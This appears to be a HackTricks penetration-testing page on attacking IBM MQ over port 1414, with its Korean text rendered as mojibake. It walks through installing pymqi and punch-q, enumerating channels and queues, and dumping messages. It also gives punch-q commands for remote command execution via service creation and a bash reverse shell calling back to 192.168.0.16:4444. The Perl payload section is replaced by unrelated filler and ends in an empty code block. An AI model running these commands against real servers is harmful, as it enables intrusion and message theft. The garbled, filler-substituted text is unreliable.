# 1414 - IBM MQ íœí…ŒìŠ¤íŒ…

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>ë¥¼ í†µí•´ AWS í•´í‚¹ì„ ì²˜ìŒë¶€í„° ì „ë¬¸ê°€ê¹Œì§€ ë°°ì›Œë³´ì„¸ìš”<strong>!</strong></summary>

* **ì‚¬ì´ë²„ ë³´ì•ˆ íšŒì‚¬**ì—ì„œ ì¼í•˜ì‹œë‚˜ìš”? **íšŒì‚¬ë¥¼ HackTricksì—ì„œ ê´‘ê³ **í•˜ê±°ë‚˜ **PEASSì˜ ìµœì‹  ë²„ì „ì— ì•¡ì„¸ìŠ¤**í•˜ê±°ë‚˜ **HackTricksë¥¼ PDFë¡œ ë‹¤ìš´ë¡œë“œ**í•˜ê³  ì‹¶ìœ¼ì‹ ê°€ìš”? [**êµ¬ë… ìš”ê¸ˆì œ**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•´ë³´ì„¸ìš”!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•´ë³´ì„¸ìš”. ë…ì ì ì¸ [**NFT**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜ì…ë‹ˆë‹¤.
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì›¨ê·¸**](https://peass.creator-spring.com)ë¥¼ ì–»ìœ¼ì„¸ìš”.
* [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— **ì°¸ì—¬**í•˜ê±°ë‚˜ **Twitter**ì—ì„œ **íŒ”ë¡œìš°**í•˜ì„¸ìš” ğŸ¦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **[hacktricks repo](https://github.com/carlospolop/hacktricks)ì™€ [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**ì— PRì„ ì œì¶œí•˜ì—¬ ì—¬ëŸ¬ë¶„ì˜ í•´í‚¹ ê¸°ë²•ì„ ê³µìœ í•˜ì„¸ìš”.

</details>

## ê¸°ë³¸ ì •ë³´

IBM MQëŠ” ë©”ì‹œì§€ íë¥¼ ê´€ë¦¬í•˜ê¸° ìœ„í•œ IBM ê¸°ìˆ ì…ë‹ˆë‹¤. ë‹¤ë¥¸ **ë©”ì‹œì§€ ë¸Œë¡œì»¤** ê¸°ìˆ ê³¼ ë§ˆì°¬ê°€ì§€ë¡œ, ìƒì‚°ìì™€ ì†Œë¹„ì ê°„ì˜ ì •ë³´ë¥¼ ìˆ˜ì‹ , ì €ì¥, ì²˜ë¦¬ ë° ë¶„ë¥˜í•˜ëŠ” ë° ì‚¬ìš©ë©ë‹ˆë‹¤.

ê¸°ë³¸ì ìœ¼ë¡œ **IBM MQ TCP í¬íŠ¸ 1414**ë¥¼ ë…¸ì¶œí•©ë‹ˆë‹¤.
ë•Œë¡œëŠ” HTTP REST APIê°€ í¬íŠ¸ **9443**ì—ì„œ ë…¸ì¶œë  ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤.
ë©”íŠ¸ë¦­ (Prometheus)ì€ TCP í¬íŠ¸ **9157**ì—ì„œ ì•¡ì„¸ìŠ¤í•  ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤.

IBM MQ TCP í¬íŠ¸ 1414ëŠ” ë©”ì‹œì§€, í, ì±„ë„ ë“±ì„ ì¡°ì‘í•˜ëŠ” ë° ì‚¬ìš©ë  ìˆ˜ ìˆì§€ë§Œ **ì¸ìŠ¤í„´ìŠ¤ë¥¼ ì œì–´í•˜ëŠ” ë°ì—ë„ ì‚¬ìš©ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤**.

IBMì€ [https://www.ibm.com/docs/en/ibm-mq](https://www.ibm.com/docs/en/ibm-mq)ì—ì„œ ì‚¬ìš© ê°€ëŠ¥í•œ ë‹¤ì–‘í•œ ê¸°ìˆ  ë¬¸ì„œë¥¼ ì œê³µí•©ë‹ˆë‹¤.

## ë„êµ¬

ì‰¬ìš´ ê³µê²©ì„ ìœ„í•œ ì œì•ˆëœ ë„êµ¬ëŠ” Dockerë¥¼ ì‚¬ìš©í•œ **[punch-q](https://github.com/sensepost/punch-q)**ì…ë‹ˆë‹¤. ì´ ë„êµ¬ëŠ” Python ë¼ì´ë¸ŒëŸ¬ë¦¬ `pymqi`ë¥¼ í™œìš©í•˜ê³  ìˆìŠµë‹ˆë‹¤.

ë” ìˆ˜ë™ì ì¸ ì ‘ê·¼ì„ ìœ„í•´ì„œëŠ” Python ë¼ì´ë¸ŒëŸ¬ë¦¬ **[pymqi](https://github.com/dsuch/pymqi)**ë¥¼ ì‚¬ìš©í•˜ì„¸ìš”. [IBM MQ ì¢…ì†ì„±](https://www.ibm.com/support/fixcentral/swg/selectFixes?parent=ibm%7EWebSphere&product=ibm/WebSphere/WebSphere+MQ&release=9.0.0.4&platform=All&function=fixId&fixids=9.0.0.4-IBM-MQC-*,9.0.0.4-IBM-MQ-Install-Java-All,9.0.0.4-IBM-MQ-Java-InstallRA&useReleaseAsTarget=true&includeSupersedes=0&source=fc)ì´ í•„ìš”í•©ë‹ˆë‹¤.

### pymqi ì„¤ì¹˜í•˜ê¸°

**IBM MQ ì¢…ì†ì„±**ì„ ì„¤ì¹˜í•˜ê³  ë¡œë“œí•´ì•¼ í•©ë‹ˆë‹¤:

1. [https://login.ibm.com/](https://login.ibm.com/)ì—ì„œ ê³„ì • (IBMid)ì„ ìƒì„±í•˜ì„¸ìš”.
2. [https://www.ibm.com/support/fixcentral/swg/selectFixes?parent=ibm%7EWebSphere&product=ibm/WebSphere/WebSphere+MQ&release=9.0.0.4&platform=All&function=fixId&fixids=9.0.0.4-IBM-MQC-*,9.0.0.4-IBM-MQ-Install-Java-All,9.0.0.4-IBM-MQ-Java-InstallRA&useReleaseAsTarget=true&includeSupersedes=0&source=fc](https://www.ibm.com/support/fixcentral/swg/selectFixes?parent=ibm%7EWebSphere&product=ibm/WebSphere/WebSphere+MQ&release=9.0.0.4&platform=All&function=fixId&fixids=9.0.0.4-IBM-MQC-*,9.0.0.4-IBM-MQ-Install-Java-All,9.0.0.4-IBM-MQ-Java-InstallRA&useReleaseAsTarget=true&includeSupersedes=0&source=fc)ì—ì„œ IBM MQ ë¼ì´ë¸ŒëŸ¬ë¦¬ë¥¼ ë‹¤ìš´ë¡œë“œí•˜ì„¸ìš”. Linux x86_64ì˜ ê²½ìš° **9.0.0.4-IBM-MQC-LinuxX64.tar.gz**ì…ë‹ˆë‹¤.
3. ì••ì¶•ì„ í•´ì œí•˜ì„¸ìš” (`tar xvzf 9.0.0.4-IBM-MQC-LinuxX64.tar.gz`).
4. ë¼ì´ì„ ìŠ¤ ì•½ê´€ì„ ìˆ˜ë½í•˜ê¸° ìœ„í•´ `sudo ./mqlicense.sh`ë¥¼ ì‹¤í–‰í•˜ì„¸ìš”.

>Kali Linuxë¥¼ ì‚¬ìš©í•˜ëŠ” ê²½ìš°, `mqlicense.sh` íŒŒì¼ì„ ìˆ˜ì •í•˜ì„¸ìš”. ë‹¤ìŒ ë¼ì¸ë“¤ì„ ì œê±°í•˜ê±°ë‚˜ ì£¼ì„ ì²˜ë¦¬í•˜ì„¸ìš” (105-110ë²ˆì§¸ ì¤„ ì‚¬ì´):
>
>```bash
>if [ ${BUILD_PLATFORM} != `uname`_`uname ${UNAME_FLAG}` ]
>  then
>    echo "ERROR: This package is incompatible with this system"
>    echo "       This package was built for ${BUILD_PLATFORM}"
>    exit 1
>fi
>```

5. ë‹¤ìŒ íŒ¨í‚¤ì§€ë“¤ì„ ì„¤ì¹˜í•˜ì„¸ìš”:
```bash
sudo rpm --prefix /opt/mqm -ivh --nodeps --force-debian MQSeriesRuntime-9.0.0-4.x86_64.rpm
sudo rpm --prefix /opt/mqm -ivh --nodeps --force-debian MQSeriesClient-9.0.0-4.x86_64.rpm
sudo rpm --prefix /opt/mqm -ivh --nodeps --force-debian MQSeriesSDK-9.0.0-4.x86_64.rpm
```
6. ê·¸ëŸ° ë‹¤ìŒ LDì— `.so` íŒŒì¼ì„ ì¼ì‹œì ìœ¼ë¡œ ì¶”ê°€í•˜ì‹­ì‹œì˜¤: `export LD_LIBRARY_PATH=/opt/mqm/lib64`, ì´í›„ì— ì´ëŸ¬í•œ ì¢…ì†ì„±ì„ ì‚¬ìš©í•˜ëŠ” ë‹¤ë¥¸ ë„êµ¬ë¥¼ ì‹¤í–‰í•˜ê¸° ì „ì—.

ê·¸ëŸ° ë‹¤ìŒ, [**pymqi**](https://github.com/dsuch/pymqi) í”„ë¡œì íŠ¸ë¥¼ ë³µì œí•˜ì‹­ì‹œì˜¤. í¥ë¯¸ë¡œìš´ ì½”ë“œ ìŠ¤ë‹ˆí«, ìƒìˆ˜ ë“±ì´ í¬í•¨ë˜ì–´ ìˆìŠµë‹ˆë‹¤. ë˜ëŠ” `pip install pymqi`ë¥¼ ì‚¬ìš©í•˜ì—¬ ë¼ì´ë¸ŒëŸ¬ë¦¬ë¥¼ ì§ì ‘ ì„¤ì¹˜í•  ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤.

### punch-q ì‚¬ìš©

#### Dockerë¥¼ ì‚¬ìš©í•˜ëŠ” ê²½ìš°

ê°„ë‹¨íˆ `sudo docker run --rm -ti leonjza/punch-q`ë¥¼ ì‚¬ìš©í•˜ì‹­ì‹œì˜¤.

#### Dockerë¥¼ ì‚¬ìš©í•˜ì§€ ì•ŠëŠ” ê²½ìš°

[**punch-q**](https://github.com/sensepost/punch-q) í”„ë¡œì íŠ¸ë¥¼ ë³µì œí•œ ë‹¤ìŒ ì„¤ì¹˜ì— ëŒ€í•œ readmeë¥¼ ë”°ë¥´ì‹­ì‹œì˜¤ (`pip install -r requirements.txt && python3 setup.py install`).

ê·¸ í›„ì— `punch-q` ëª…ë ¹ì–´ë¡œ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

## ì—´ê±°

**punch-q** ë˜ëŠ” **pymqi**ë¥¼ ì‚¬ìš©í•˜ì—¬ **í ë§¤ë‹ˆì € ì´ë¦„, ì‚¬ìš©ì, ì±„ë„ ë° í**ë¥¼ ì—´ê±°í•´ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### í ë§¤ë‹ˆì €

ë•Œë¡œëŠ” í ë§¤ë‹ˆì € ì´ë¦„ì„ ì–»ëŠ” ë° ëŒ€í•œ ë³´í˜¸ê°€ ì—†ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```bash
â¯ sudo docker run --rm -ti leonjza/punch-q --host 172.17.0.2 --port 1414 discover name
Queue Manager name: MYQUEUEMGR
```
### ì±„ë„

**punch-q**ëŠ” ê¸°ì¡´ ì±„ë„ì„ ì°¾ê¸° ìœ„í•´ ë‚´ë¶€(ìˆ˜ì • ê°€ëŠ¥) ì›Œë“œë¦¬ìŠ¤íŠ¸ë¥¼ ì‚¬ìš©í•©ë‹ˆë‹¤. ì‚¬ìš© ì˜ˆì‹œ:
```bash
â¯ sudo docker run --rm -ti leonjza/punch-q --host 172.17.0.2 --port 1414 --username admin --password passw0rd discover channels
"DEV.ADMIN.SVRCONN" exists and was authorised.
"SYSTEM.AUTO.SVRCONN" might exist, but user was not authorised.
"SYSTEM.DEF.SVRCONN" might exist, but user was not authorised.
```
ì¼ë¶€ IBM MQ ì¸ìŠ¤í„´ìŠ¤ëŠ” **ì¸ì¦ë˜ì§€ ì•Šì€** MQ ìš”ì²­ì„ í—ˆìš©í•˜ëŠ” ê²½ìš°ê°€ ìˆìœ¼ë¯€ë¡œ `--username / --password`ëŠ” í•„ìš”í•˜ì§€ ì•ŠìŠµë‹ˆë‹¤. ë¬¼ë¡  ì•¡ì„¸ìŠ¤ ê¶Œí•œë„ ë‹¤ë¥¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

í•œ ë²ˆ ì±„ë„ ì´ë¦„ (ì—¬ê¸°ì„œëŠ” `DEV.ADMIN.SVRCONN`)ì„ ì–»ìœ¼ë©´ ë‹¤ë¥¸ ëª¨ë“  ì±„ë„ì„ ì—´ê±°í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ì—´ê±°ëŠ” ê¸°ë³¸ì ìœ¼ë¡œ **pymqi**ì˜ `code/examples/dis_channels.py` ì½”ë“œ ìŠ¤ë‹ˆí«ì„ ì‚¬ìš©í•˜ì—¬ ìˆ˜í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```python
import logging
import pymqi

logging.basicConfig(level=logging.INFO)

queue_manager = 'MYQUEUEMGR'
channel = 'DEV.ADMIN.SVRCONN'
host = '172.17.0.2'
port = '1414'
conn_info = '%s(%s)' % (host, port)
user = 'admin'
password = 'passw0rd'

prefix = '*'

args = {pymqi.CMQCFC.MQCACH_CHANNEL_NAME: prefix}

qmgr = pymqi.connect(queue_manager, channel, conn_info, user, password)
pcf = pymqi.PCFExecute(qmgr)

try:
response = pcf.MQCMD_INQUIRE_CHANNEL(args)
except pymqi.MQMIError as e:
if e.comp == pymqi.CMQC.MQCC_FAILED and e.reason == pymqi.CMQC.MQRC_UNKNOWN_OBJECT_NAME:
logging.info('No channels matched prefix `%s`' % prefix)
else:
raise
else:
for channel_info in response:
channel_name = channel_info[pymqi.CMQCFC.MQCACH_CHANNEL_NAME]
logging.info('Found channel `%s`' % channel_name)

qmgr.disconnect()

```
...í•˜ì§€ë§Œ **punch-q**ë„ ê·¸ ë¶€ë¶„ì„ í¬í•¨í•˜ê³  ìˆìŠµë‹ˆë‹¤(ë” ë§ì€ ì •ë³´ì™€ í•¨ê»˜!). ë‹¤ìŒê³¼ ê°™ì´ ì‹¤í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```bash
â¯ sudo docker run --rm -ti leonjza/punch-q --host 172.17.0.2 --port 1414 --username admin --password passw0rd --channel DEV.ADMIN.SVRCONN show channels -p '*'
Showing channels with prefix: "*"...

| Name                 | Type              | MCA UID | Conn Name | Xmit Queue | Description     | SSL Cipher |
|----------------------|-------------------|---------|-----------|------------|-----------------|------------|
| DEV.ADMIN.SVRCONN    | Server-connection |         |           |            |                 |            |
| DEV.APP.SVRCONN      | Server-connection | app     |           |            |                 |            |
| SYSTEM.AUTO.RECEIVER | Receiver          |         |           |            | Auto-defined by |            |
| SYSTEM.AUTO.SVRCONN  | Server-connection |         |           |            | Auto-defined by |            |
| SYSTEM.DEF.AMQP      | AMQP              |         |           |            |                 |            |
| SYSTEM.DEF.CLUSRCVR  | Cluster-receiver  |         |           |            |                 |            |
| SYSTEM.DEF.CLUSSDR   | Cluster-sender    |         |           |            |                 |            |
| SYSTEM.DEF.RECEIVER  | Receiver          |         |           |            |                 |            |
| SYSTEM.DEF.REQUESTER | Requester         |         |           |            |                 |            |
| SYSTEM.DEF.SENDER    | Sender            |         |           |            |                 |            |
| SYSTEM.DEF.SERVER    | Server            |         |           |            |                 |            |
| SYSTEM.DEF.SVRCONN   | Server-connection |         |           |            |                 |            |
| SYSTEM.DEF.CLNTCONN  | Client-connection |         |           |            |                 |            |
```
### í

**pymqi** (`dis_queues.py`)ì™€ í•¨ê»˜ ì‚¬ìš©í•  ìˆ˜ ìˆëŠ” ì½”ë“œ ìŠ¤ë‹ˆí«ì´ ìˆì§€ë§Œ **punch-q**ë¥¼ ì‚¬ìš©í•˜ë©´ íì— ëŒ€í•œ ë” ë§ì€ ì •ë³´ë¥¼ ê°€ì ¸ì˜¬ ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```bash
â¯ sudo docker run --rm -ti leonjza/punch-q --host 172.17.0.2 --port 1414 --username admin --password passw0rd --channel DEV.ADMIN.SVRCONN show queues -p '*'
Showing queues with prefix: "*"...
| Created   | Name                 | Type   | Usage   | Depth  | Rmt. QM | Rmt. Qu | Description                       |
|           |                      |        |         |        | GR Name | eue Nam |                                   |
|           |                      |        |         |        |         | e       |                                   |
|-----------|----------------------|--------|---------|--------|---------|---------|-----------------------------------|
| 2023-10-1 | DEV.DEAD.LETTER.QUEU | Local  | Normal  | 0      |         |         |                                   |
| 0 18.35.1 | E                    |        |         |        |         |         |                                   |
| 9         |                      |        |         |        |         |         |                                   |
| 2023-10-1 | DEV.QUEUE.1          | Local  | Normal  | 0      |         |         |                                   |
| 0 18.35.1 |                      |        |         |        |         |         |                                   |
| 9         |                      |        |         |        |         |         |                                   |
| 2023-10-1 | DEV.QUEUE.2          | Local  | Normal  | 0      |         |         |                                   |
| 0 18.35.1 |                      |        |         |        |         |         |                                   |
| 9         |                      |        |         |        |         |         |                                   |
| 2023-10-1 | DEV.QUEUE.3          | Local  | Normal  | 0      |         |         |                                   |
| 0 18.35.1 |                      |        |         |        |         |         |                                   |
| 9         |                      |        |         |        |         |         |                                   |
# Truncated
```
## Exploit

### ë©”ì‹œì§€ ë¤í”„

í/ì±„ë„ì„ ëŒ€ìƒìœ¼ë¡œí•˜ì—¬ ë©”ì‹œì§€ë¥¼ ê°€ë¡œì±„ê±°ë‚˜ ë¤í”„í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤ (íŒŒê´´ì ì¸ ì‘ì—…ì€ ì•„ë‹™ë‹ˆë‹¤). *ì˜ˆì‹œ:*
```bash
â¯ sudo docker run --rm -ti leonjza/punch-q --host 172.17.0.2 --port 1414 --username admin --password passw0rd --channel DEV.ADMIN.SVRCONN messages sniff
```

```bash
â¯ sudo docker run --rm -ti leonjza/punch-q --host 172.17.0.2 --port 1414 --username admin --password passw0rd --channel DEV.ADMIN.SVRCONN messages dump
```
**ëª¨ë“  ì‹ë³„ëœ íì— ëŒ€í•´ ì£¼ì €í•˜ì§€ ë§ê³  ë°˜ë³µí•˜ì„¸ìš”.**

### ì½”ë“œ ì‹¤í–‰

> ê³„ì†í•˜ê¸° ì „ì— ëª‡ ê°€ì§€ ì„¸ë¶€ ì •ë³´: IBM MQëŠ” MQSC, PCF, ì œì–´ ëª…ë ¹ì„ í†µí•´ ì œì–´ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì¼ë°˜ì ì¸ ëª©ë¡ì€ [IBM MQ ë¬¸ì„œ](https://www.ibm.com/docs/en/ibm-mq/9.2?topic=reference-command-sets-comparison)ì—ì„œ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.
> [**PCF**](https://www.ibm.com/docs/en/ibm-mq/9.3?topic=commands-introduction-mq-programmable-command-formats) (***Programmable Command Formats***)ëŠ” ì›ê²©ìœ¼ë¡œ ì¸ìŠ¤í„´ìŠ¤ì™€ ìƒí˜¸ ì‘ìš©í•˜ê¸° ìœ„í•´ ì£¼ë¡œ ì‚¬ìš©ë©ë‹ˆë‹¤. **punch-q**ì™€ **pymqi**ëŠ” PCF ìƒí˜¸ ì‘ìš©ì„ ê¸°ë°˜ìœ¼ë¡œ í•©ë‹ˆë‹¤.
>
> PCF ëª…ë ¹ì˜ ëª©ë¡ì„ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤:
> * [PCF ë¬¸ì„œì—ì„œ](https://www.ibm.com/docs/en/ibm-mq/9.3?topic=reference-definitions-programmable-command-formats), ê·¸ë¦¬ê³ 
> * [ìƒìˆ˜ì—ì„œ](https://www.ibm.com/docs/en/ibm-mq/9.3?topic=constants-mqcmd-command-codes).
>
> í¥ë¯¸ë¡œìš´ ëª…ë ¹ ì¤‘ í•˜ë‚˜ëŠ” `MQCMD_CREATE_SERVICE`ì´ë©°, í•´ë‹¹ ë¬¸ì„œëŠ” [ì—¬ê¸°](https://www.ibm.com/docs/en/ibm-mq/9.3?topic=formats-change-copy-create-service-multiplatforms)ì—ì„œ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ ëª…ë ¹ì€ ì¸ìŠ¤í„´ìŠ¤ì˜ ë¡œì»¬ í”„ë¡œê·¸ë¨ì„ ê°€ë¦¬í‚¤ëŠ” `StartCommand`ë¥¼ ì¸ìˆ˜ë¡œ ì‚¬ìš©í•©ë‹ˆë‹¤ (ì˜ˆ: `/bin/sh`).
>
> ë¬¸ì„œì—ì„œ ì´ ëª…ë ¹ì— ëŒ€í•œ ê²½ê³ ë„ ìˆìŠµë‹ˆë‹¤: *"ì£¼ì˜: ì´ ëª…ë ¹ì€ ì‚¬ìš©ìê°€ mqm ê¶Œí•œìœ¼ë¡œ ì„ì˜ì˜ ëª…ë ¹ì„ ì‹¤í–‰í•  ìˆ˜ ìˆê²Œ í•©ë‹ˆë‹¤. ì´ ëª…ë ¹ì„ ì‚¬ìš©í•  ê¶Œí•œì´ ë¶€ì—¬ëœ ê²½ìš°, ì•…ì˜ì ì´ê±°ë‚˜ ë¶€ì£¼ì˜í•œ ì‚¬ìš©ìê°€ ì‹œìŠ¤í…œì´ë‚˜ ë°ì´í„°ë¥¼ ì†ìƒì‹œí‚¬ ìˆ˜ ìˆëŠ” ì„œë¹„ìŠ¤ë¥¼ ì •ì˜í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì˜ˆë¥¼ ë“¤ì–´ í•„ìˆ˜ íŒŒì¼ì„ ì‚­ì œí•˜ëŠ” ë“±ì˜ ì‘ì—…ì„ ìˆ˜í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤."*
>
> *ì°¸ê³ : IBM MQ ë¬¸ì„œ (ê´€ë¦¬ ì°¸ì¡°)ì— ë”°ë¥´ë©´, ì„œë¹„ìŠ¤ ìƒì„± (`DEFINE SERVICE`)ë¥¼ ìœ„í•œ ë™ë“±í•œ MQSC ëª…ë ¹ì„ ì‹¤í–‰í•˜ëŠ” HTTP ì—”ë“œí¬ì¸íŠ¸ì¸ `/admin/action/qmgr/{qmgrName}/mqsc`ë„ ìˆìŠµë‹ˆë‹¤. ì´ ì¸¡ë©´ì€ ì•„ì§ ë‹¤ë£¨ì§€ ì•Šì•˜ìŠµë‹ˆë‹¤.*

ì›ê²© í”„ë¡œê·¸ë¨ ì‹¤í–‰ì„ ìœ„í•œ PCFë¥¼ ì‚¬ìš©í•œ ì„œë¹„ìŠ¤ ìƒì„±/ì‚­ì œëŠ” **punch-q**ë¥¼ í†µí•´ ìˆ˜í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:

**ì˜ˆì œ 1**
```bash
â¯ sudo docker run --rm -ti leonjza/punch-q --host 172.17.0.2 --port 1414 --username admin --password passw0rd --channel DEV.ADMIN.SVRCONN command execute --cmd "/bin/sh" --args "-c id"
```
> IBM MQì˜ ë¡œê·¸ì—ì„œ ëª…ë ¹ì´ ì„±ê³µì ìœ¼ë¡œ ì‹¤í–‰ë˜ì—ˆìŒì„ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
>
> ```bash
> 2023-10-10T19:13:01.713Z AMQ5030I: ëª…ë ¹ '808544aa7fc94c48'ì´ ì‹œì‘ë˜ì—ˆìŠµë‹ˆë‹¤. í”„ë¡œì„¸ìŠ¤ ID(618). [ArithInsert1(618), CommentInsert1(808544aa7fc94c48)]
> ```

ë˜í•œ ê¸°ê¸°ì— ìˆëŠ” ê¸°ì¡´ í”„ë¡œê·¸ë¨ë“¤ì„ ì—´ê±°í•  ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤ (ì—¬ê¸°ì„œ `/bin/doesnotexist`ëŠ” ì¡´ì¬í•˜ì§€ ì•ŠìŠµë‹ˆë‹¤):
```bash
â¯ sudo docker run --rm -ti leonjza/punch-q --host 172.17.0.2 --port 1414 --username admin --password passw0rd --channel DEV.ADMIN.SVRCONN command execute --cmd "/bin/doesnotexist" --arg
s "whatever"
Command: /bin/doesnotexist
Arguments: -c id
Service Name: 6e3ef5af652b4436

Creating service...
Starting service...
The program '/bin/doesnotexist' is not available on the remote system.
Giving the service 0 second(s) to live...
Cleaning up service...
Done
```
**í”„ë¡œê·¸ë¨ ì‹¤í–‰ì´ ë¹„ë™ê¸°ì ìœ¼ë¡œ ì§„í–‰ë˜ë¯€ë¡œ, ì•…ìš©ì„ ìœ„í•´ ë‘ ë²ˆì§¸ í•­ëª©ì´ í•„ìš”í•©ë‹ˆë‹¤** ***(ë¦¬ë²„ìŠ¤ ì‰˜ì„ ìœ„í•œ ë¦¬ìŠ¤ë„ˆ, ë‹¤ë¥¸ ì„œë¹„ìŠ¤ì—ì„œì˜ íŒŒì¼ ìƒì„±, ë„¤íŠ¸ì›Œí¬ë¥¼ í†µí•œ ë°ì´í„° ìœ ì¶œ ë“±)***

**ì˜ˆì‹œ 2**

ê°„í¸í•œ ë¦¬ë²„ìŠ¤ ì‰˜ì„ ìœ„í•´, **punch-q**ëŠ” ë‘ ê°€ì§€ ë¦¬ë²„ìŠ¤ ì‰˜ í˜ì´ë¡œë“œë¥¼ ì œê³µí•©ë‹ˆë‹¤:

* bashë¥¼ ì‚¬ìš©í•œ í˜ì´ë¡œë“œ
* perlì„ ì‚¬ìš©í•œ í˜ì´ë¡œë“œ

*ë¬¼ë¡  `execute` ëª…ë ¹ì–´ë¥¼ ì‚¬ìš©í•˜ì—¬ ì‚¬ìš©ì ì •ì˜ í˜ì´ë¡œë“œë¥¼ ë§Œë“¤ ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤.*

bashë¥¼ ì‚¬ìš©í•˜ëŠ” ê²½ìš°:
```bash
â¯ sudo docker run --rm -ti leonjza/punch-q --host 172.17.0.2 --port 1414 --username admin --password passw0rd --channel DEV.ADMIN.SVRCONN command reverse -i 192.168.0.16 -p 4444
```
í„(Perl)ì— ëŒ€í•´:

Perlì€ ê°•ë ¥í•œ ìŠ¤í¬ë¦½íŒ… ì–¸ì–´ë¡œ, ë‹¤ì–‘í•œ ìš´ì˜ ì²´ì œì—ì„œ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. í„ì€ í…ìŠ¤íŠ¸ ì²˜ë¦¬, íŒŒì¼ ì¡°ì‘, ë„¤íŠ¸ì›Œí¬ í†µì‹  ë“± ë‹¤ì–‘í•œ ì‘ì—…ì— ì‚¬ìš©ë©ë‹ˆë‹¤. í„ì€ ê°„ê²°í•˜ê³  ìœ ì—°í•œ ë¬¸ë²•ì„ ê°€ì§€ê³  ìˆìœ¼ë©°, ë‹¤ì–‘í•œ ëª¨ë“ˆê³¼ ë¼ì´ë¸ŒëŸ¬ë¦¬ë¥¼ ì œê³µí•˜ì—¬ ê°œë°œìê°€ ì›í•˜ëŠ” ê¸°ëŠ¥ì„ ì‰½ê²Œ êµ¬í˜„í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

í„ì„ ì‚¬ìš©í•˜ì—¬ ë„¤íŠ¸ì›Œí¬ ì„œë¹„ìŠ¤ íœí…ŒìŠ¤íŒ…ì„ ìˆ˜í–‰í•  ë•Œ, ë‹¤ì–‘í•œ ê¸°ëŠ¥ê³¼ ëª¨ë“ˆì„ í™œìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì˜ˆë¥¼ ë“¤ì–´, í„ì„ ì‚¬ìš©í•˜ì—¬ ì†Œì¼“ í”„ë¡œê·¸ë˜ë°ì„ ìˆ˜í–‰í•˜ê±°ë‚˜, ë„¤íŠ¸ì›Œí¬ í”„ë¡œí† ì½œì„ ì¡°ì‘í•˜ê±°ë‚˜, íŒ¨í‚·ì„ ìº¡ì²˜í•˜ê³  ë¶„ì„í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë˜í•œ, í„ì„ ì‚¬ìš©í•˜ì—¬ ì›¹ ì„œë¹„ìŠ¤ë‚˜ ë°ì´í„°ë² ì´ìŠ¤ì™€ì˜ í†µì‹ ì„ ìë™í™”í•˜ê±°ë‚˜, ë³´ì•ˆ ì·¨ì•½ì ì„ ê²€ì‚¬í•˜ëŠ” ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì‘ì„±í•  ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤.

í„ì€ ê°•ë ¥í•œ ë¬¸ìì—´ ì²˜ë¦¬ ê¸°ëŠ¥ì„ ì œê³µí•˜ë©°, ì •ê·œ í‘œí˜„ì‹ì„ ì‚¬ìš©í•˜ì—¬ í…ìŠ¤íŠ¸ë¥¼ ê²€ìƒ‰í•˜ê³  ë³€í˜•í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë˜í•œ, í„ì€ íŒŒì¼ ì¡°ì‘ì— ìœ ìš©í•œ ê¸°ëŠ¥ë“¤ì„ ì œê³µí•˜ë©°, íŒŒì¼ì˜ ì½ê¸°, ì“°ê¸°, ìˆ˜ì • ë“± ë‹¤ì–‘í•œ ì‘ì—…ì„ ìˆ˜í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

í„ì€ ë‹¤ì–‘í•œ ìš´ì˜ ì²´ì œì—ì„œ ì‚¬ìš©í•  ìˆ˜ ìˆìœ¼ë©°, ì»¤ë®¤ë‹ˆí‹°ì—ì„œëŠ” ë‹¤ì–‘í•œ ëª¨ë“ˆê³¼ ë¼ì´ë¸ŒëŸ¬ë¦¬ë¥¼ ì œê³µí•˜ê³  ìˆìŠµë‹ˆë‹¤. ì´ëŸ¬í•œ ëª¨ë“ˆê³¼ ë¼ì´ë¸ŒëŸ¬ë¦¬ë¥¼ í™œìš©í•˜ì—¬ í„ì˜ ê¸°ëŠ¥ì„ í™•ì¥í•  ìˆ˜ ìˆìœ¼ë©°, ê°œë°œìë“¤ì€ ì´ë¥¼ í†µí•´ ë”ìš± íš¨ìœ¨ì ì¸ ì½”ë“œë¥¼ ì‘ì„±í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```bash
